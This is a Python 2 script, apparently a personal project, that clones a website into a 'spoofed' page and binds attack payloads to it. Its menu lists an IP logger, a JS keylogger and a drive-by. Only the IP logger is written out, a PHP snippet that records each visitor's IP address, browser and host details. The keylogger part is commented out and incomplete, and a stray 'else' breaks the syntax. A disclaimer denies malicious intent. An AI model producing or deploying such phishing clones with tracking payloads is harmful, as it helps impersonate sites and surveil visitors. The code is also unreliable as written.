# -*- coding: cp1252 -*-

# DEAR WHOEVER SEES MY UPLOADED CONTENT,
# I'M NOT USING THIS MALICIOUSLY
# IM ONLY TESTING PYTHON SKILLS I WILL NEVER SCAM
# CHEAT OR FRAUD ANYONE WITH THIS TOOL
# OR RELEASE THE PAGES GENERATED TO GIVE TO ANYONE
# THIS IS A PERSONAL PROJECT AND IM NOT HOSTING MALICIOUS CONTENT
# TL;DR NOT PHISHING OR HACKING PERSONAL PROJECT

#!/usr/bin/python
import urllib
import time
import os

# Check if old file (spoofed.html) exists 
fileName = 'spoofed.html'
checkIfExist = os.path.isfile(fileName)

# Create spoofed.html if not exist
if checkIfExist == 0:
    open(fileName, "w")

#Delete spoofed.html if exist
if checkIfExist == 1:
    os.remove(fileName)
    
print 'Enter website url to spoof e.g (http://google.com)'

url = raw_input()

# Download the website files
print 'Spoofing '+ url + ', this may take a few'
urllib.urlretrieve (url, fileName)

# Tell the user we finished
print 'Download completed'
os.system("cls")

# Store downloaded website content in spoofed.html
fileOpen = open(fileName, 'r')
fileContent = fileOpen.read()
fileOpen.close()

# Choose what payloads to add to new webpage
print 'Enter corresponding key to add payload:'
print '[1] Add ip logger'
print '[2] Add JS Keylogger'
print '[3] Add Drive-by'
payload = raw_input()

# Ip logger payload
if payload == '1':
    ipLogger = '<?php\n$file="iplog.txt";\n$f=fopen($file,"a");\nfwrite($f,"-------------------------"."\n");\nfwrite($f,"IP Address:".$_SERVER["REMOTE_ADDR"]."\n");\nfwrite($f,"User Agemt:".$_SERVER["HTTP_USER_AGENT"]."\n");\nfwrite($f,"Host Name:".php_uname("n")."\n");\nfwrite($f,"Operating System:".php_uname("v")."(".php_uname("s").")"."\n");\nfclose($f);\n?>'
    print 'Create new name for file: eg. (google)'
    newFileName = raw_input() + '.php'
    print 'Binding an ip logger to ' + newFileName
    
    makePage = open (newFileName, 'a') ## a will append, w will over-write
    makePage.write(ipLogger)           ## 
    makePage.write(fileContent)
    makePage.close()
    print 'Bound payload(s) successfully! Exiting in 4 seconds...'
    os.remove(fileName)
    time.sleep(4)

    else
    print 'Payload(s) failed to be bound! Exiting in 4 seconds...'
    os.remove(fileName)
    time.sleep(4)

# XSS/JS Keylogger + PHP
#if payload == '2':
    #newFileName = raw_input() + '.php'
    #print 'Please enter url where you will store your '+ newFileName + ' file eg.(http://mywebsite.com/' + newFileName
    #fileUrl = raw_input() + newFileName
